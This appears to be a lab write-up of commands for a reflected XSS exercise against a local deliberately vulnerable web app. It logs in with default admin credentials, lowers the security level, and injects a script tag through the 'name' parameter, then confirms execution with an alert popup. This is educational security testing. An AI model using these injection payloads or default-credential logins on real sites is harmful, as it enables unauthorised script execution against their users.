# Commands — XSS (Reflected) Lab

## 1. Authenticate and establish session

```bash
curl -c cookies.txt -s http://localhost:4280/login.php -o login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" login.html)

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  -o login_result.html

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/security.php \
  -d "security=low&seclev_submit=Submit" -o security_result.html
```

## 2. Inspect baseline page

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/xss_r/" -o xss_r_baseline.html
grep -A15 "vulnerable_code_area" xss_r_baseline.html
```

**Result:** A simple form submitting a `name` parameter via GET, with no visible client-side validation or filtering.

## 3. Confirm reflected injection via curl (server-side proof)

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>#" \
  -o xss_r_payload.html
grep -A3 "Hello" xss_r_payload.html
```

**Result:**
```html
<pre>Hello <script>alert('XSS')</script></pre>
```

The raw `<script>` tag is present in the server's HTTP response — unlike DOM XSS (Lab 10), this alone proves server-side reflection without needing a browser to execute anything.

## 4. Trigger the exploit in a real browser

Navigated directly to:
```
http://localhost:4280/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>#
```

**Result:** Browser alert box fired immediately on page load, displaying `XSS` — confirmed in `screenshots/01-reflected-xss-popup.png`.
